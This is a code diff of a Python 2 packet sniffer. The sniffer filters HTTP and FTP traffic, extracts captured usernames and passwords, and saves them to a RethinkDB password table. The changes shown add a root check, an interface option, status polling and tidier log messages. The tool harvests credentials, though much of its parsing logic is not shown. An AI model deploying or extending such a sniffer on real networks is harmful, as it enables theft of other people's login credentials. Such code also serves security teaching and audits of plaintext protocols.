@@ -8,7 +8,7 @@ import signal
 import sys
 import os
 import argparse
-import pdb
+# import pdb
 
 import rethinkdb as r
 from rethinkdb.errors import RqlRuntimeError, RqlDriverError
@@ -32,9 +32,9 @@ def dbSetup():
 
         # Initial status value
         r.db(PWD_DB).table('status_table').insert([{"status": "ON"}]).run(connection)
-        print 'Database setup completed. Now run the sniffer without --setup.'
+        print '[-] Database setup completed. Now run the sniffer without --setup.'
     except RqlRuntimeError:
-        print 'Sniffer database already exists. Run the sniffer without --setup.'
+        print '[-] Sniffer database already exists. Run the sniffer without --setup.'
     finally:
         connection.close()
 
@@ -44,15 +44,14 @@ class Sniffer(object):
         try:
             self.rdb_conn = r.connect(host=RDB_HOST, port=RDB_PORT, db=PWD_DB)
         except RqlDriverError:
-            print "No database connection could be established."
-            sys.exit(0)
+            sys.exit("[!] No database connection could be established.")
 
         cursor = r.table("status_table").run(self.rdb_conn)
         for document in cursor:
-            self.status_id = document['id']
+            self.status_id = document.get('id')
 
         # Status ON
-        print r.table('status_table').get(self.status_id).update({"status": "ON"}).run(self.rdb_conn)
+        r.table('status_table').get(self.status_id).update({"status": "ON"}).run(self.rdb_conn)
 
         pattern = 'tcp and dst port 80 or dst port 21'
         # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
@@ -96,7 +95,7 @@ class Sniffer(object):
         device_info = self.devices_mac[add_colons_to_mac(eth_src)]
 
         if 'login' and 'password' in device_info.keys():
-            print "FTP New Password get:"
+            print "[-] FTP New Password get:"
             pprint(self.devices_mac[add_colons_to_mac(eth_src)])
             r.table('pwd_table').insert([self.devices_mac[add_colons_to_mac(eth_src)]]).run(self.rdb_conn)
 
@@ -147,7 +146,7 @@ class Sniffer(object):
         else:
             self.all_user_info[self.info_counter].update({'password': None})
 
-        print "HTTP New Password get:"
+        print "[-] HTTP New Password get:"
         pprint(self.all_user_info[self.info_counter])
         r.table('pwd_table').insert([self.all_user_info[self.info_counter]]).run(self.rdb_conn)
 
@@ -235,12 +234,14 @@ class Sniffer(object):
 
     def loop(self):
         # result = {'status': 'ON'}
-        cursor = r.table("status_table").changes().run(self.rdb_conn)
-        for document in cursor:
-            status_result = document['status']
-
+        # cursor = r.table("status_table").get(self.status_id).changes().run(self.rdb_conn)
+        # print status_result
+        # for document in cursor:
+        #     print document.get('status')
         while True:
-            if status_result == 'ON':
+            result = r.table("status_table").get(self.status_id).run(self.rdb_conn)
+            # pdb.set_trace()
+            if result.get('status') == 'ON':
                 try:
                     for ts, buf in self.pc:
                         eth = dpkt.ethernet.Ethernet(buf)
@@ -258,20 +259,22 @@ class Sniffer(object):
 
                 except KeyboardInterrupt:
                     nrecv, ndrop, nifdrop = self.pc.stats()
-                    print '\n%d packets received by filter' % nrecv
-                    print '%d packets dropped by kernel' % ndrop
+                    print '\n[-] %d packets received by filter' % nrecv
+                    print '[-] %d packets dropped by kernel' % ndrop
                     break
                 except (NameError, TypeError):
                     # print "No packet"
                     continue
             else:
                 signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
-                print "I can not see packets."
+                print "[-] I can not see packets."
                 continue
 
     def __del__(self):
         # Status OFF
         r.table('status_table').get(self.status_id).update({"status": "OFF"}).run(self.rdb_conn)
+        result = r.table("status_table").get(self.status_id).run(self.rdb_conn)
+        print '[*] Sniffer is %s' % result['status']
         # pdb.set_trace()
         try:
             self.rdb_conn.close()
@@ -282,11 +285,16 @@ class Sniffer(object):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Run the Sniffer')
     parser.add_argument('--setup', dest='run_setup', action='store_true')
-
+    parser.add_argument("-s", '--interface',
+                        help='Specify an interface',
+                        default='eth0')
     args = parser.parse_args()
+
     if args.run_setup:
         dbSetup()
     else:
-        s = Sniffer(interface='eth0')
-        print '%s is listening on' % s.pc.name
+        if os.geteuid():
+            sys.exit('[-] Please run as root')
+        s = Sniffer(interface=args.interface)
+        print '[*] Using interface:', s.pc.name
         s.loop()
